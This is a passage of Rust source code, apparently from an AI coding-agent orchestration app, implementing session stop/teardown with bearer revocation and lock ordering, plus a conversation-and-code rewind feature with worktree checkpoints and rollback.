    // is never a sub-agent branch (issue #99); an open_texts row carries
    // whichever tag it was created with.
    let mut texts: Vec<(i32, String, Option<String>)> = inner
        .current
        .take()
        .map(|(id, text, _)| (id, text, None))
        .into_iter()
        .collect();
    texts.extend(
        inner
            .open_texts
            .drain()
            .map(|(_, r)| (r.row, r.buf, r.agent_thread)),
    );
    // Drain tool rows still awaiting a result, but DON'T finalize here: the
    // caller makes the stop visible (sets `stopped`) first. Awaiting DB/event
    // work while the engine is reset-but-not-yet-stopped would let a concurrent
    // send start a turn on the idle engine that we'd then wrongly mark stopped.
    let orphan_tools: Vec<(i32, serde_json::Value)> =
        inner.tool_rows.drain().map(|(_, v)| v).collect();
    inner.generation += 1; // orphan the reader so EOF handling is ours
    if let Some(c) = inner.child.as_mut() {
        let _ = c.kill().await;
    }
    // Kill the per-session app-server too (its consumer task exits as the sinks
    // close); the next send respawns it, picking up refreshed skills/MCP.
    if let Some(c) = inner.codex_client.take() {
        c.shutdown().await;
    }
    // Kill the bearer BEFORE the lock goes, not only at the release below.
    // Stop is the user saying "no more actions from this session", and the ACP
    // cancel/unsubscribe this function is about to await can block on a backend
    // that is still running — for an ACP engine that is precisely the window in
    // which its child, or an orphan holding the session URL, could keep issuing
    // computer actions under a standing Full/Always grant. Bumping the epoch
    // does not help: the HTTP endpoint authenticates the bearer, not the epoch.
    //
    // The later `release_child_slot` is still required and is NOT redundant: a
    // send admitted during the unlocked window can reach `spawn_turn` and mint
    // a REPLACEMENT bearer, and that one has to die with this stop too. Doing
    // both is safe because `revoke_engine_bearer` consumes the stamp — the
    // second call is a no-op unless a new mint re-stamped it.
    revoke_engine_bearer(&mut inner);
    // Cancel any in-flight ACP prompt and drop the session route so a late
    // acp_emit_turn_end cannot overwrite stopped → idle after takeover.
    let AcpTeardown {
        client: acp,
        session_id: acp_sid,
        asks: acp_asks,
    } = take_acp_teardown_and_invalidate(&mut inner);
    // Closed the other direction of the same race. Bumping the epoch stops work
    // that reserved BEFORE this teardown from landing after it; this stops work
    // admitted DURING it. The ACP cancel/unsubscribe below need the lock
    // released, and `stopped` is not set until `stop` returns, so a human send
    // or bus wake in that window reserves against the NEW epoch, passes every
    // check, and is then silently discarded when the reset below replaces
    // `turn` with `TurnState::default()`.
    inner.tearing_down = true;
    // Drop the engine lock before awaiting ACP cancel/unsubscribe (they take
    // the runtime mutex). Re-lock afterwards for the remaining field clears.
    drop(inner);
    if let Some(c) = acp {
        if let Some(sid) = acp_sid {
            let _ = c.cancel(&sid).await;
            c.unsubscribe(&sid).await;
        }
    }
    let mut inner = eng.lock().await;
    inner.child = None;
    inner.child_reg = None;
    // Hand the session_gate slot back on the explicit stop, not on the next
    // spawn. "Stop" is a high-frequency button and a stopped session may never
    // send again — holding its slot until a respawn that never comes is a leak
    // for the life of the process (the gate is a `OnceLock` singleton), and it
    // is exactly what the resource dashboard (issue #112) surfaces as an
    // active-session count that never falls back to zero. The bearer rides the
    // same helper: this is the chokepoint every teardown funnels through (hard
    // stop, switch teardown, restart), and resume stays safe because every
    // respawn path re-mints first (`refresh_computer_injection`).
    //
    // The SECOND of this teardown's two revokes, and not redundant with the
    // one before the lock was dropped for the ACP cancel. That window does not
    // set `stopped` until this function returns, so a send admitted inside it
    // reaches `spawn_turn` and mints a REPLACEMENT bearer — which this Stop
    // must kill too. The early revoke can't see that mint; this one can't
    // protect the ACP child during the cancel await. Both are needed.
    //
    // Safe to repeat because `revoke_engine_bearer` consumes the stamp: with
    // no new mint in between this is inert, and it can never reach past its
    // own generation into a bearer that now belongs to somebody else.
    release_child_slot(&mut inner);
    inner.stdin = None;
    inner.turn = TurnState::default();
    inner.clock = TurnClock::default();
    inner.turn_user_row = None;
    // Keep any hidden receipt token alive across the hard stop; its detached
    // consume task still owns the DB linearization point.
    // A hard stop ends the turn: clear the per-turn text marker, or the NEXT
    // turn inherits a stale true and a pre-output failure there would wrongly
    // suppress its error_before_output row.
    inner.turn_saw_text = false;
    // The window is over: state is fully reset, so the engine can accept work
    // again (a skill bounce reuses this same engine right after).
    inner.tearing_down = false;
    StopQuietOutcome {
        thread_id: target.0,
        session_id: target.1,
        texts,
        orphans: orphan_tools,
        acp_asks,
        was_busy,
    }
}

/// Hard-reset an engine under the same per-surface admission gate used by
/// visible sends and durable hidden batches. This prevents a user Stop or
/// switch/rewind reset from interleaving between the first durable row's spawn
/// and the later FIFO reservations in the batch.
pub async fn stop_quiet(eng: &EngineRef) -> StopQuietOutcome {
    let key = {
        let inner = eng.lock().await;
        inner
            .session_id
            .map(i64::from)
            .unwrap_or_else(|| super::commands::lead_key(inner.thread_id))
    };
    let _serial = admission_gate_for_key(key).lock_owned().await;
    stop_quiet_admitted(eng).await
}

/// Stop an engine while the caller already owns the global engine-admission
/// write fence (for example a destructive workspace/repo/thread cascade).
///
/// The normal public [`stop`] wrapper acquires the per-surface serial gate
/// first. A caller that already holds the global write lock must not acquire a
/// surface gate here: normal admission is surface gate -> global read, so
/// global write -> surface gate would form the classic two-lock cycle. The
/// destructive caller owns the write fence for the complete cascade and all
/// admitted activity has drained before this core runs.
pub(crate) async fn stop_under_engine_admission(app: &AppHandle, eng: &EngineRef) {
    stop_admitted(app, eng).await;
}

/// Stop the engine outright (e.g. before a terminal takeover or by the runaway
/// guard). Persists `STATUS_STOPPED` so a stopped/taken-over session can't be
/// falsely revived into a COMPETING headless process — neither by the boot
/// revive sweep (which only resumes "running") nor by a coordinator bus wake
/// (which skips "stopped"). Distinct from "idle" so a cleanly-idle session can
/// still be driven by a bus post.
pub async fn stop(app: &AppHandle, eng: &EngineRef) {
    let key = {
        let inner = eng.lock().await;
        inner
            .session_id
            .map(i64::from)
            .unwrap_or_else(|| super::commands::lead_key(inner.thread_id))
    };
    let _serial = admission_gate_for_key(key).lock_owned().await;
    stop_admitted(app, eng).await;
}

/// Stop implementation shared by the public gate-owning wrapper and
/// destructive callers that already hold the global write fence.
async fn stop_admitted(app: &AppHandle, eng: &EngineRef) {
    let StopQuietOutcome {
        thread_id,
        session_id,
        texts,
        orphans,
        acp_asks,
        ..
    } = stop_quiet_admitted(eng).await;
    let mut inner = eng.lock().await;
    inner.stopped = true;
    drop(inner);
    // Drop open ACP permission cards so Always/Full cannot land after takeover.
    if let Some(asks) = app.try_state::<crate::ask::AskRegistry>() {
        for id in acp_asks {
            asks.inner().cancel(id);
        }
    }
    if let Some(db) = app.try_state::<Db>() {
        persist_activity(&db, session_id, thread_id, STATUS_STOPPED).await;
        // Stop is now visible to the engine, so finalizing here can't race a
        // concurrent send into a turn we'd wrongly kill.
        finalize_orphan_tool_rows(app, &db, thread_id, orphans, "interrupted").await;
        for (id, text, agent_thread) in texts {
            let _ = repo::update_lead_message(
                &db,
                id,
                &text_row_content(&text, agent_thread.as_deref()),
                "interrupted",
            )
            .await;
            emit_finalize(app, thread_id, id, "interrupted");
        }
        let _ = mark_queued_status(app, &db, thread_id, session_id, "interrupted").await;
    }
    let _ = app.emit(
        EVENT,
        Push::Turn {
            thread_id,
            session_id,
            state: "stopped".into(),
            queue: Vec::new(),
        },
    );
}

/// Which halves of a rewind to perform: conversation (native fork + timeline
/// truncation), code (shadow-repo worktree restore), or both. The wire values
/// are the frontend contract (`chat_rewind`'s `mode` arg).
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum RewindMode {
    Conversation,
    Code,
    Both,
}

impl RewindMode {
    pub fn parse(s: &str) -> Result<Self, String> {
        match s {
            "conversation" => Ok(Self::Conversation),
            "code" => Ok(Self::Code),
            "both" => Ok(Self::Both),
            _ => Err(format!("invalid rewind mode: {s}")),
        }
    }
}

/// What a rewind hands back to the composer (conversation fields are
/// zero-valued for a code-only rewind).
#[derive(Clone, Debug, serde::Serialize)]
pub struct RewindOutcome {
    /// The target message's text, to prefill the composer for edit + resend.
    /// Empty for a code-only rewind (the timeline is untouched there).
    pub rewound_text: String,
    /// Timeline rows deleted (the target itself plus everything after it,
    /// queued rows included).
    pub deleted: u64,
    /// The session's NEW native id (the fork), or None when the next turn
    /// starts a brand-new native session (rewound to before the first
    /// message, or the session had no native id).
    pub native_id: Option<String>,
    /// True when the worktree was restored to the message's pre-turn
    /// checkpoint (modes code/both; conversation-only leaves it false).
    pub code_restored: bool,
}

/// The 1-based cut ordinal for `target` under the addressing rule of `tool`'s
/// dialect.
///
/// The dialects disagree about ONE case: a message with no text. ACP always
/// writes a text block (`{"type":"text","text":""}` for an image-only prompt,
/// since images ride as sibling blocks rather than the spilled-path appendix
/// per-turn tools append), so an empty prompt is a real, matchable entry. In a
/// claude transcript the same message has no text block at all and
/// `rewind::user_text` skips the line, so an empty target is unaddressable and
/// a zero — which surfaces as "this session has no rewind anchor" — is the
/// honest answer rather than a cut at the wrong line.
fn rewind_ordinal(tool: &str, texts: &[String], target: &str) -> usize {
    if crate::acp::backend_for(tool).is_some() {
        return super::rewind::ordinal_of_prompt(texts, target);
    }
    super::rewind::ordinal_of(texts, target)
}

/// Acquire a rewind's surface admission gate before the same per-thread
/// lifecycle gate used by destructive cascades, then reload the complete
/// durable identity behind the reserved rewind. Normal activity is ordered
/// surface -> global read, while deletion is global write -> lifecycle and
/// never takes a surface gate; taking surface first here avoids a three-lock
/// cycle when all three paths overlap. Deletion installs its marker before
/// waiting for the lifecycle gate, so a delete that won first is observed here
/// before any timeline read, native fork, or restore.
async fn acquire_rewind_lifecycle(
    bus: &crate::bus::BusRegistry,
    state: &LeadChatState,
    db: &Db,
    eng: &EngineRef,
    thread_id: i32,
    session_id: Option<i32>,
    direction_scope: &str,
) -> anyhow::Result<(
    tokio::sync::OwnedMutexGuard<()>,
    tokio::sync::OwnedMutexGuard<()>,
)> {
    let admission_key = session_id
        .map(i64::from)
        .unwrap_or_else(|| super::commands::lead_key(thread_id));
    // Lock order is surface -> lifecycle. Keep the owned surface guard through
    // validation and the complete rewind so `rewind_reserved` can use admitted
    // stop/reset helpers without reacquiring the same gate.
    let surface = admission_gate_for_key(admission_key).lock_owned().await;
    let lifecycle = bus.thread_lifecycle_gate(thread_id).lock_owned().await;
    validate_registered_engine_identity(
        Some(state),
        db,
        eng,
        thread_id,
        session_id,
        direction_scope,
    )
    .await?;
    Ok((surface, lifecycle))
}

/// Run an already-reserved rewind under its surface and thread lifecycle
/// gates. Keep this separate from the global engine admission lock: delete
/// takes admission-write before lifecycle and never takes surface, so a rewind
/// must acquire surface before lifecycle and never reacquire either gate in
/// `rewind_reserved`. Both gates stay held through the complete operation and
/// until the engine reservation is cleared, including code-only early returns.
async fn run_rewind_reserved_under_lifecycle<T, F, Fut>(
    bus: &crate::bus::BusRegistry,
    state: &LeadChatState,
    db: &Db,
    eng: &EngineRef,
    thread_id: i32,
    session_id: Option<i32>,
    direction_scope: &str,
    operation: F,
) -> anyhow::Result<T>
where
    F: FnOnce() -> Fut,
    Fut: std::future::Future<Output = anyhow::Result<T>>,
{
    let (surface, lifecycle) =
        match acquire_rewind_lifecycle(bus, state, db, eng, thread_id, session_id, direction_scope)
            .await
        {
            Ok(lifecycle) => lifecycle,
            Err(error) => {
                eng.lock().await.rewinding = false;
                return Err(error);
            }
        };
    let result = operation().await;
    eng.lock().await.rewinding = false;
    drop(lifecycle);
    drop(surface);
    result
}

/// Rewind a worker session's OR the lead console's conversation to just
/// BEFORE `message_id`: fork the native session at the cut point (claude
/// transcript surgery / codex `thread/fork` / opencode `session/fork`), drop
/// the target row and everything after it, and hand the target's text back
/// for the composer. The original native session stays untouched as the
/// natural backup. The turn must be idle — rewind refuses a busy engine
/// rather than auto-interrupting, and holds a reservation (`inner.rewinding`)
/// from that check to the final truncate so no new turn can start in between.
///
/// `mode` adds the code half (worker sessions only — the lead has no
/// worktree): Code restores the worktree to the message's pre-turn checkpoint
/// and leaves the timeline/native session untouched; Both restores AND
/// rewinds the conversation. A missing checkpoint fails the whole rewind
/// before anything is forked/truncated.
pub async fn rewind(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    message_id: i32,
    mode: RewindMode,
) -> anyhow::Result<RewindOutcome> {
    let (thread_id, session_id, direction_scope) = {
        let mut inner = eng.lock().await;
        if inner.turn.busy {
            return Err(anyhow::anyhow!("先中断当前 turn"));
        }
        if inner.rewinding {
            return Err(anyhow::anyhow!("会话正在回退，请稍后重试"));
        }
        // Reserve the engine for the whole operation, under the same lock as
        // the busy check: a send either lands first (busy → we refuse here) or
        // loses to this reservation and errors out in `send` — no turn can
        // start mid-rewind for the stop/truncate steps to silently consume.
        inner.rewinding = true;
        (inner.thread_id, inner.session_id, inner.ask_dir.clone())
    };
    let bus = app.state::<crate::bus::BusRegistry>();
    let state = app.state::<LeadChatState>();
    run_rewind_reserved_under_lifecycle(
        &bus,
        &state,
        db,
        eng,
        thread_id,
        session_id,
        &direction_scope,
        || rewind_reserved(app, db, eng, message_id, mode),
    )
    .await
}

/// The body of [`rewind`], run with the engine's rewind reservation held.
async fn rewind_reserved(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    message_id: i32,
    mode: RewindMode,
) -> anyhow::Result<RewindOutcome> {
    let snap = {
        let inner = eng.lock().await;
        if inner.turn.busy {
            return Err(anyhow::anyhow!("先中断当前 turn"));
        }
        RewindSnap {
            thread_id: inner.thread_id,
            session_id: inner.session_id,
            tool: inner.tool.clone(),
            command: inner.command.clone(),
            // The CURRENT injection, deliberately NOT refreshed: this
            // snapshot spawns a short-lived codex client to fork a thread,
            // alongside the engine's own still-live one. Re-minting here
            // would rotate the identity's generation and 401 the live
            // client's computer tool. A transient fork client
            // never makes computer calls, so carrying a possibly-stale
            // bearer costs nothing.
            extra_args: {
                let mut a = inner.extra_args.clone();
                a.extend(inner.computer_args.iter().cloned());
                a
            },
            extra_env: spawn_env(&inner),
            cwd: inner.cwd.clone(),
            native_id: inner.native_id.clone(),
            system_prompt: inner.system_prompt.clone(),
            codex_client: inner.codex_client.clone(),
            acp_client: inner.acp_client.clone(),
        }
    };
    // Lead engines (session_id None) can only rewind the conversation — they
    // have no worktree to checkpoint or restore.
    if snap.session_id.is_none() && mode != RewindMode::Conversation {
        return Err(anyhow::anyhow!("lead 会话没有 worktree，不支持代码回退"));
    }

    // The target row must be a completed user message of THIS timeline.
    let rows = repo::list_lead_messages(db, snap.thread_id).await?;
    let session_rows: Vec<&crate::store::entities::lead_message::Model> = rows
        .iter()
        .filter(|m| m.session_id == snap.session_id)
        .collect();
    let Some(pos) = session_rows.iter().position(|m| m.id == message_id) else {
        return Err(anyhow::anyhow!("消息不存在"));
    };
    let target = session_rows[pos];
    if target.role != "user" {
        return Err(anyhow::anyhow!("只能回退用户消息"));
    }
    if target.status != "complete" {
        return Err(anyhow::anyhow!("只能回退已发送完成的消息"));
    }
    let target_turn = target.turn_id;
    let rewound_text = serde_json::from_str::<serde_json::Value>(&target.content)
        .ok()
        .and_then(|v| v["text"].as_str().map(String::from))
        .unwrap_or_default();

    // A conversation rewind can abandon repository actions whose card rows
    // are in the deleted suffix. Lock their durable execution tokens before
    // any native fork or filesystem restore. The lifecycle gate is already
    // held, and these OS locks are non-blocking, so a concurrently executing
    // action makes rewind fail cleanly instead of deadlocking with deletion.
    let planned_deleted_ids = if mode == RewindMode::Code {
        Vec::new()
    } else {
        session_rows[pos..].iter().map(|message| message.id).collect()
    };
    let action_executions = repo::repo_action_executions_requiring_lock_for_message_ids(
        db,
        snap.thread_id,
        &planned_deleted_ids,
    )
    .await?;
    let action_cleanups = crate::commands::lock_repo_action_cleanups(db, action_executions)
        .await
        .map_err(anyhow::Error::msg)?;
    let action_cleanup_plans = crate::commands::repo_action_cleanup_plans(&action_cleanups);
    let action_rewind_plans = crate::commands::repo_action_rewind_plans(&action_cleanups);

    // The cut anchor lives on the nearest user row BEFORE the target (its
    // turn's end = the native state right before the target was sent). Only
    // DELIVERED rows count — queued/error user rows never reached the native
    // history and would skew both the anchor and the ordinal (review P2).
    let prev_user = session_rows[..pos]
        .iter()
        .rev()
        .find(|m| super::rewind::native_delivered(&m.role, &m.status));
    let anchor = prev_user.and_then(|m| m.native_anchor.clone());
    // The text the native side actually stores: send() appends attachment
    // instructions/spill paths, so the match must use the reconstructed
    // DISPATCHED text (the raw content.text only ever matches bare messages).
    // The composer prefill still uses the raw rewound_text.
    let per_turn_tool = per_turn(&snap.tool);
    let match_text = super::rewind::dispatched_text(per_turn_tool, target.id, &target.content);
    // Fallback ordinal for claude's/opencode's text cut: the target's 1-based
    // position among same-text user rows of this session, up to and including
    // itself. Counted under the SAME whitespace-normalized identity the
    // transcript cut uses (rewind::ordinal_of), or a `hello  world`/`hello
    // world` pair would fork at a different point than the timeline truncates.
    let user_texts: Vec<String> = session_rows[..=pos]
        .iter()
        .filter(|m| super::rewind::native_delivered(&m.role, &m.status))
        .map(|m| super::rewind::dispatched_text(per_turn_tool, m.id, &m.content))
        .collect();
    let ordinal = rewind_ordinal(&snap.tool, &user_texts, &match_text);

    // Resolve the session's worktree ONCE: mandatory for the code half,
    // best-effort for a conversation-only rewind (it only drives the
    // checkpoint-row sweep below).
    let wt = match snap.session_id {
        Some(sid) => session_worktree(db, sid).await?,
        None => None,
    };
    // Resolve the code half BEFORE mutating anything (fork/stop/truncate): a
    // missing checkpoint must fail the whole rewind, not half of it.
    let code_target = match mode {
        RewindMode::Conversation => None,
        _ => {
            let Some(w) = &wt else {
                return Err(anyhow::anyhow!("该消息没有代码检查点（旧会话或快照失败）"));
            };
            Some(resolve_code_target(db, w, snap.session_id, message_id).await?)
        }
    };

    // The native id to cut: a worker's lives on the engine; the lead's lives
    // in its per-thread meta row.
    let old_native: Option<String> = match snap.session_id {
        Some(_) => snap.native_id.clone(),
        None => repo::lead_native_id(db, snap.thread_id).await?,
    };

    // Fork BEFORE mutating anything (stop/truncate), so a fork failure leaves
    // the session fully intact.
    let new_native: Option<String> = match mode {
        // Restore only: the native session is untouched.
        RewindMode::Code => None,
        _ => match snap.tool.as_str() {
            "claude" => match &old_native {
                // No native session yet → nothing to cut; the next turn starts one.
                None => None,
                Some(old) => {
                    let cut = match &anchor {
                        Some(a) => super::rewind::ClaudeCut::AfterUuid(a.clone()),
                        None => {
                            if ordinal == 0 {
                                return Err(anyhow::anyhow!("该会话历史缺少回退锚点（旧会话）"));
                            }
                            super::rewind::ClaudeCut::BeforeUserText {
                                text: match_text.clone(),
                                ordinal,
                            }
                        }
                    };
                    super::rewind::fork_claude_at(&snap.cwd, old, &cut)?
                }
            },
            "codex" => {
                if !codex_appserver_enabled() {
                    return Err(anyhow::anyhow!("codex exec 模式暂不支持回退"));
                }
                match &old_native {
                    None => None,
                    Some(old) => match (prev_user.is_some(), anchor) {
                        // Rewinding to before the FIRST user message: the next turn
                        // starts a brand-new thread (no fork to make).
                        (false, _) => None,
                        (true, None) => {
                            return Err(anyhow::anyhow!("该会话历史缺少回退锚点（旧会话）"));
                        }
                        (true, Some(turn_id)) => {
                            Some(fork_codex_thread(&snap, old, &turn_id).await?)
                        }
                    },
                }
            }
            "opencode" => match &old_native {
                // No native session yet → nothing to cut; the next turn starts one.
                None => None,
                // Rewinding to before the FIRST user message: the next turn
                // starts a brand-new session (no fork to make).
                Some(_) if prev_user.is_none() => None,
                Some(old) => {
                    // opencode streams carry no rewind anchor — the cut is
                    // always the text+ordinal match against the served history.
                    if ordinal == 0 {
                        return Err(anyhow::anyhow!("该会话历史缺少回退锚点（旧会话）"));
                    }
                    let program =
                        crate::tool_command::effective(snap.command.as_deref(), &snap.tool);
                    Some(
                        super::rewind::fork_opencode_at(
                            &program,
                            &snap.cwd,
                            old,
                            &match_text,
                            ordinal,
                        )
                        .await?,
                    )
                }
            },
            t if crate::acp::backend_for(t).is_some() => match &old_native {
                None => None,
                Some(_) if prev_user.is_none() => None,
                Some(old) => {
                    if ordinal == 0 {
                        return Err(anyhow::anyhow!("该会话历史缺少回退锚点（旧会话）"));
                    }
                    super::rewind::fork_omp_at(
                        &snap.cwd,
                        old,
                        &match_text,
                        ordinal,
                        &snap.system_prompt,
                    )?
                }
            },
            _ => return Err(anyhow::anyhow!("该工具暂不支持回退")),
        },
    };

    // The code restore runs after the fork and before the restart: both halves
    // land (or fail) while the session is still fully intact. The worktree is
    // RESERVED first, then siblings are re-checked — a sibling send admitted
    // before the reservation shows up busy now; one after it is refused at
    // admission, so no agent edits the worktree mid-restore. Shadow ops are
    // serialized per worktree via the op lock.
    let mut code_restored = false;
    // Compensation context for a post-restore persistence failure (both mode):
    // put the worktree back so a rewind can't end half-applied. The
    // reservation AND the shadow op lock live to the end of the function,
    // covering persistence and any compensation — a second rewind can't
    // restore between our restore and our rollback.
    let mut compensation: Option<(
        std::path::PathBuf,
        std::path::PathBuf,
        crate::checkpoint::RestoreReceipt,
    )> = None;
    let mut _reservation = None;
    let mut _op_arc = None;
    let mut _op_guard = None;
    // Post-checkpoint nested repos to delete once the rewind is DURABLE (they
    // can't be recreated by rollback, so deletion waits until it can't roll).
    let mut nested_cleanup: Option<(std::path::PathBuf, Vec<String>)> = None;
    if let Some(t) = code_target {
        let reservation = crate::checkpoint::begin_worktree_op_reservation(t.worktree_id);
        if sibling_turn_busy(app, db, t.direction_id, t.repo_id, t.session_id).await? {
            return Err(anyhow::anyhow!("另一个会话正在使用该 worktree，请先中断它"));
        }
        _op_arc = Some(crate::checkpoint::op_lock(t.worktree_id));
        if let Some(a) = _op_arc.as_ref() {
            _op_guard = Some(a.lock().await);
        }
        let (wt_path, wt_shadow) = (t.path.clone(), t.shadow.clone());
        nested_cleanup = Some((t.path.clone(), t.nested_repos.clone()));
        let receipt = tokio::task::spawn_blocking(move || {
            crate::checkpoint::restore(
                &t.path,
                &t.shadow,
                t.session_id,
                &t.shadow_sha,
                &t.head_sha,
                &t.base_commit,
                &t.nested_repos,
                &t.index_tree,
                Some(&t.branch),
            )
        })
        .await??;
        compensation = Some((wt_path, wt_shadow, receipt));
        code_restored = true;
        _reservation = Some(reservation);
    }
    if mode == RewindMode::Code {
        // Code-only has no persistence to roll back into it — deleting now is
        // as durable as it gets; a deletion failure is surfaced, not hidden.
        if let Some((p, recorded)) = nested_cleanup {
            cleanup_unrecorded_nested(p, recorded).await.map_err(|e| {
                anyhow::anyhow!("代码已回退，但删除检查点之后新建的嵌套仓库失败：{e}")
            })?;
        }
        return Ok(RewindOutcome {
            rewound_text: String::new(),
            deleted: 0,
            native_id: None,
            code_restored,
        });
    }

    // Fork (and any restore) succeeded: restart the engine and persist the
    // truncation + forked native id — atomically (one transaction), so a DB
    // failure can't leave a truncated timeline pointing at the old native
    // history. A failure HERE, after a restore already happened, is still
    // compensated by rolling the worktree back to its pre-restore state.
    let persist = async {
        // `rewind` already owns the surface admission gate. Reacquiring the
        // public wrapper here would self-deadlock; use the admitted reset core.
        stop_quiet_admitted(eng).await;
        let (deleted_ids, cancelled_request_ids) = repo::rewind_persist_with_repo_actions(
            db,
            snap.thread_id,
            snap.session_id,
            message_id,
            wt.as_ref().map(|w| w.id),
            new_native.as_deref(),
            &action_cleanup_plans,
            &action_rewind_plans,
        )
        .await?;
        eng.lock().await.native_id = new_native.clone();
        Ok::<(Vec<i32>, Vec<i32>), anyhow::Error>((deleted_ids, cancelled_request_ids))
    };
    let (deleted_ids, cancelled_request_ids) = match persist.await {
        Ok(outcome) => outcome,
        Err(e) => {
            if let Some((p, s, receipt)) = compensation {
                // spawn_blocking gives Result<Result<()>, JoinError> — check
                // BOTH layers: a normal rollback error is Ok(Err(..)) and
                // must not be silently dropped (the whole point of
                // compensating).
                let rb = tokio::task::spawn_blocking(move || {
                    crate::checkpoint::rollback_restore(&p, &s, &receipt)
                })
                .await;
                match rb {
                    Ok(Ok(())) => {}
                    Ok(Err(rb_err)) => {
                        return Err(anyhow::anyhow!(
                            "回退持久化失败（{e}），且补偿回滚也失败（{rb_err}）——worktree 已回退，backup ref 仍在可手动恢复"
                        ));
                    }
                    Err(join_err) => {
                        return Err(anyhow::anyhow!(
                            "回退持久化失败（{e}），且补偿回滚异常终止（{join_err}）——worktree 已回退，backup ref 仍在可手动恢复"
                        ));
                    }
                }
            }
            return Err(e);
        }
    };
    let deleted = deleted_ids.len() as u64;
    crate::commands::cleanup_locked_repo_actions(db, &action_cleanups).await;
    let durable_ids: Vec<u64> = cancelled_request_ids
        .iter()
        .filter_map(|request_id| u64::try_from(*request_id).ok())
        .collect();
    // The DB transition is committed. Converge every retained process-local
    // ask/inbox and provider card before any fallible post-commit filesystem
    // cleanup can return early. Answered/resolved requests still receive the
    // later Cancelled event because their IM cards must match durable state.
    app.state::<crate::bus::BusRegistry>()
        .apply_committed_human_cancellations(snap.thread_id, &durable_ids);
    // The divider row every surface renders between the kept past and the
    // rewound future. Best-effort: the rewind itself already happened.
    insert_rewind_marker(
        app,
        db,
        snap.thread_id,
        snap.session_id,
        target_turn,
        message_id,
        deleted,
    )
    .await;
    let _ = app.emit(
        EVENT,
        Push::Rewound {
            thread_id: snap.thread_id,
            session_id: snap.session_id,
            native_id: new_native.clone(),
        },
    );
    // Conversation + code are durably rewound — only NOW can post-checkpoint
    // nested repos be deleted (rollback can no longer need them). A deletion
    // failure is surfaced, but cannot suppress the committed cancellation and
    // rewind events above.
    if let Some((p, recorded)) = nested_cleanup {
        cleanup_unrecorded_nested(p, recorded)
            .await
            .map_err(|e| anyhow::anyhow!("回退已完成，但删除检查点之后新建的嵌套仓库失败：{e}"))?;
    }
    Ok(RewindOutcome {
        rewound_text,
        deleted,
        native_id: new_native,
        code_restored,
    })
}

/// Best-effort deletion of post-checkpoint nested repos, called ONLY once the
/// rewind is durable (committed persistence or a code-only restore): the
/// shadow backup records embedded repos as gitlinks, so a rollback can't
/// recreate them and they must survive until rollback is off the table.
/// Failures are PROPAGATED — a leftover nested repo contradicts the promised
/// rewind and must be surfaced, not just logged.
async fn cleanup_unrecorded_nested(
    path: std::path::PathBuf,
    recorded: Vec<String>,
) -> anyhow::Result<usize> {
    let removed = tokio::task::spawn_blocking(move || {
        crate::checkpoint::remove_unrecorded_nested_repos(&path, &recorded)
    })
    .await
    .map_err(|e| anyhow::anyhow!("nested cleanup task failed: {e}"))??;
    Ok(removed)
}

/// The worktree a worker session runs in (via its direction + repo), or None
/// when the session or its worktree row is gone.
async fn session_worktree(
    db: &Db,
    session_id: i32,
) -> anyhow::Result<Option<crate::store::entities::worktree::Model>> {
    let Some(sess) = repo::get_session(db, session_id).await? else {
        return Ok(None);
    };
    repo::worktree_for(db, sess.direction_id, sess.repo_id).await
}

/// Pre-turn code checkpoint (worker sessions only): snapshot the session's
/// worktree into its shadow repo and record the row keyed by the user message
/// opening this turn, so a later code rewind can restore exactly this point.
/// Best-effort by contract — every failure is logged and swallowed, so a
/// checkpoint hiccup can never block or break a turn. Callers await it BEFORE
/// the turn's message is dispatched to the agent.
async fn snapshot_turn_checkpoint(
    app: &AppHandle,
    db: &Db,
    session_id: Option<i32>,
    turn_id: i32,
    user_row_id: i32,
) {
    let Some(sid) = session_id else {
        return; // the lead has no worktree to checkpoint
    };
    if let Err(e) = snapshot_turn_checkpoint_impl(app, db, sid, turn_id, user_row_id).await {
        eprintln!("[weft] code checkpoint skipped for session {sid} turn {turn_id}: {e}");
    }
}

async fn snapshot_turn_checkpoint_impl(
    app: &AppHandle,
    db: &Db,
    session_id: i32,
    turn_id: i32,
    user_row_id: i32,
) -> anyhow::Result<()> {
    let Some(wt) = session_worktree(db, session_id).await? else {
        return Ok(());
    };
    // A reused/user-owned checkout is never snapshotted (nor restored): weft
    // must not checkpoint someone else's live directory. A reclaimed worktree
    // (row kept, dir gone) has nothing to snapshot either.
    if !wt.created_checkout {
        return Ok(());
    }
    // A sibling session mid-turn means the other agent is writing the shared
    // worktree RIGHT NOW: a snapshot taken mid-write would capture a partial
    // state a later code rewind would faithfully restore. The worktree op
    // reservation is taken FIRST, then siblings re-checked — a sibling send
    // admitted before it shows busy now; one after it is refused at
    // admission. Skip this turn's checkpoint on contention (the turn itself
    // is never blocked; the message just gets no code-rewind target, which
    // resolve_code_target reports honestly).
    let op_guard = crate::checkpoint::begin_worktree_op_reservation(wt.id);
    if sibling_turn_busy(app, db, wt.direction_id, wt.repo_id, session_id).await? {
        eprintln!("[weft] code checkpoint skipped for session {session_id} turn {turn_id}: sibling session busy on the worktree");
        return Ok(());
    }
    let path = std::path::PathBuf::from(&wt.path);
    if !path.is_dir() {
        return Ok(());
    }
    // A worktree with an initialized submodule can never be restored
    // completely (nested-repo edits are invisible to the parent's
    // snapshot/restore) — record no checkpoints for it at all.
    if crate::checkpoint::has_initialized_submodules(&path) {
        return Ok(());
    }
    // Serialized per worktree: sibling sessions share one shadow index.
    let op_lock = crate::checkpoint::op_lock(wt.id);
    let _op = op_lock.lock().await;
    // Deletion may have committed while this snapshot waited for the op lock.
    // Re-resolve every durable owner only after winning the lock and before
    // shadow_repo_for can create a directory containing source blobs.
    let session = repo::get_session(db, session_id)
        .await?
        .ok_or_else(|| anyhow::anyhow!("session deleted before checkpoint snapshot"))?;
    let current_wt = repo::worktree_for(db, session.direction_id, session.repo_id)
        .await?
        .ok_or_else(|| anyhow::anyhow!("worktree deleted before checkpoint snapshot"))?;
    if current_wt.id != wt.id || current_wt.path != wt.path {
        anyhow::bail!("worktree identity changed before checkpoint snapshot");
    }
    let direction =
        repo::ensure_direction_workspace_accepts_writes(db, session.direction_id).await?;
    if direction.id != wt.direction_id {
        anyhow::bail!("checkpoint direction identity changed");
    }
    repo::ensure_repo_workspace_accepts_writes(db, session.repo_id).await?;
    let source = repo::get_lead_message(db, user_row_id)
        .await?
        .filter(|message| {
            message.thread_id == direction.thread_id
                && message.session_id == Some(session_id)
                && message.turn_id == turn_id
        })
        .ok_or_else(|| anyhow::anyhow!("checkpoint source message was deleted"))?;
    let _ = source;
